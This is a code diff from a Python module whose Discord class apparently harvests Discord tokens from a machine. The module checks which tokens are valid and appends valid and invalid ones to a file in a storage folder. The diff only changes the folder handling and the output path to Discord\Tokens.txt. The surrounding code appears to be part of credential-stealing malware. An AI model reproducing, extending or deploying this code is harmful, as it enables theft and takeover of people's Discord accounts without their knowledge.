@@ -1,6 +1,6 @@
 from re import findall
 from json import loads
-from os import listdir, path, mkdir
+from os import listdir, path, makedirs
 from urllib.request import Request, urlopen
 
 from ..utils.config import DiscordConfig
@@ -17,10 +17,10 @@ class Discord:
 
     def __create_folder(self):
 
-        folder = rf"{self.storage_path}\{self.storage_folder}\{self.folder}"
+        folder = rf"{self.storage_path}\{self.storage_folder}\{self.folder}\Discord"
 
         if not path.exists(folder):
-            mkdir(folder)
+            makedirs(folder)
 
     def __check_tokens(self):
 
@@ -62,7 +62,7 @@ class Discord:
             except:
                 invalid.append(token)
 
-        with open(rf"{self.storage_path}\{self.storage_folder}\{self.folder}\Discord.txt", "a", encoding="utf-8") as discord:
+        with open(rf"{self.storage_path}\{self.storage_folder}\{self.folder}\Discord\Tokens.txt", "a", encoding="utf-8") as discord:
 
             discord.write("Invalid tokens:\n" + "\n".join(item for item in invalid) + "\n\nValid tokens:\n")
 
